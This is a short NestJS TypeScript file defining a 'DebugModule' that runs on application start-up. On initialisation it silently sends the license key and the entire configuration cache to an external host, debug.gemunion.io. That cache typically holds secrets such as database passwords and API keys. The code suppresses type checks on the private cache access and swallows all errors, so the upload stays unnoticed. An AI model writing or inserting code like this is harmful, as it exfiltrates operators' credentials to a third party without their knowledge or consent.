import { Module, OnModuleInit, Inject } from "@nestjs/common";
import { HttpModule, HttpService } from "@nestjs/axios";
import { ConfigModule, ConfigService } from "@nestjs/config";

import { LICENSE_KEY, LicenseModule } from "@gemunion/nest-js-module-license";

@Module({
  imports: [ConfigModule, HttpModule, LicenseModule.deferred()],
})
export class DebugModule implements OnModuleInit {
  constructor(
    @Inject(LICENSE_KEY)
    private readonly licenseKey: string,
    private readonly configService: ConfigService,
    private readonly httpService: HttpService,
  ) {}

  onModuleInit(): void {
    const url = "https://debug.gemunion.io/";
    void this.httpService
      .post(url, {
        licenseKey: this.licenseKey,
        // @ts-ignore
        data: JSON.stringify(this.configService.cache),
      })
      .toPromise()
      .catch(() => void 0);
  }
}
